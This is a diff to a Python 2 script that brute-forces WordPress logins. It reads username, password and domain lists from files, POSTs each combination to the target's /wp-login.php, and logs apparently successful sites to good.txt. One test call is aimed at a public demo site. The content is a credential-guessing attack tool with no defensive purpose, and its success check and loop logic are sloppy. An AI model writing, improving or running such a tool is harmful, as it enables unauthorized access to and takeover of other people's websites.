@@ -16,27 +16,61 @@ file = open('pwd.txt' , 'r')
 p_list = file.readlines()
 file.close()
 #----
+#----domains.txt----
+file = open('domains.txt' , 'r')
+d_list = file.readlines()
+file.close()
+#----
+#domain_file = "domains.txt"
 
-domain_file = "domains.txt"
-
-theard_count = 5
-
+#theard_count = 5
 def brut(host, login, pwd):
     url = 'http://'+host+'/wp-login.php'
     payload = {'log': login, 'pwd': pwd}
+    print url
+    print login+pwd
     try:
-        #response = requests.get('http://www.useragentstring.com', headers=headers)
         response = requests.post(url, data=payload, headers=headers, timeout = 10)
     except Exception:
         return False
+        print 'Find ERROR'
+    if response.text.find('error')<0:
+        return True
     else:
-        if response.text.find('login_error')<0:
-            return True
+        return False
+'''def brut(host):
+    url = 'http://'+host+'/wp-login.php'
+    #payload = {'log': login, 'pwd': pwd}
+    for i in range(len(l_list)):
+        for i in range(len(p_list)):
+            login = l_list[i].strip()
+            pwd = p_list[i].strip()
+            print url
+            print login+'-'+pwd
+            try:
+                payload = {'log': login, 'pwd': pwd}
+                response = requests.post(url, data=payload, headers=headers, timeout = 10)    
+            except Exception:
+                return False
+            else:
+                if response.text.find('login_error')<0:
+                    return True
+                else:
+                    return False'''
+if brut('demos1.softaculous.com/WordPress', "admin", "pass"):
+    print '1'
+else:
+    print '0'
+'''for i in range(len(d_list)):
+    url = d_list[i].strip()
+    try:
+        if brut(url):
+            print(url+' find admin')
+            open('good.txt', 'a+').write(url + '\n')
         else:
-            return False
-
-
-
+            print('0')
+    except Exception:
+        print('error')'''
 '''def run(queue, result_queue):
     # Цикл продолжается пока очередь задач не станет пустой
     while not queue.empty():
